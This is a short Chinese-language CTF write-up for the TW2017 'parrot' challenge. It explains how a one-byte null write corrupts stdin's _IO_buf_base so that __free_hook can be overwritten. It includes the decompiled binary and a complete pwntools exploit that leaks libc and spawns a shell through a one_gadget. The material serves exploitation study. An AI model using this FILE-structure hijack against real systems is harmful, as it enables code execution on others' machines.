# TW2017_parrot

**env ubuntu 16.04  libc:2.23**

程序有一个任意一字节'\x00'写入，程序使用了scanf函数，如果覆盖掉stdin结构体的_IO_buf_base成员，就可以劫持整个stdin结构体，覆盖_IO_buf_base位free_hook就可劫持free_hook

我们还要满足这些条件

```c

fp->_IO_read_ptr >= fp->_IO_read_end
want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base) 

```

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  size_t size; // [rsp+8h] [rbp-18h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  sleep(3u);
  while ( 1 )
  {
    puts("Size:");
    _isoc99_scanf("%lu", &size);
    getchar();
    if ( !size )
      break;
    buf = malloc(size);
    puts("Buffer:");
    read(0, buf, size);
    *((_BYTE *)buf + size - 1) = 0;
    write(1, buf, size);
    free(buf);
  }
  exit(0);
}
```

exp 如下：


```python

from pwn import *

context.arch = "amd64"


def add(sz,content):
	p.recvuntil("Size:")
	p.sendline(str(sz))
	p.recvuntil("Buffer:")
	p.send(content)
def main(host,port=2333):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./tw2017parrot")
		gdb.attach(p)
	add(0x20,"A"*8)
	add(0x30,"B"*8)
	add(0x400,"A")
	
	p.recv()
	
	libc.address = u64(p.recv(8))-0x3c4b41
	
	info("libc : " + hex(libc.address))
	
	p.sendline(str(libc.symbols["_IO_2_1_stdin_"]+0x38+1))
	
	
	p.recvuntil("Buffer:")
	p.sendline('')
	add(0x20,"A"*8)
	p.recvuntil("Size:")
	
	p.send(p64(0)*3+p64(libc.symbols["__free_hook"])+p64(libc.symbols["__free_hook"]+0x10))
    
    # to make fp->_IO_read_ptr >= fp->_IO_read_end
	for i in range(0x28):
		p.recvuntil("Buffer:")
		p.sendline("")
	
    # now we can overwrite the free_hook
	pause()
	onegadget = 0x4526a+libc.address
	p.recvuntil("Size:")
	p.send(p64(onegadget))
	
	p.recvuntil("Buffer:")
	p.sendline("")
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so.6",checksec=False)
	# elf = ELF("./repeaters",checksec=False)
	main(args['REMOTE'])

```
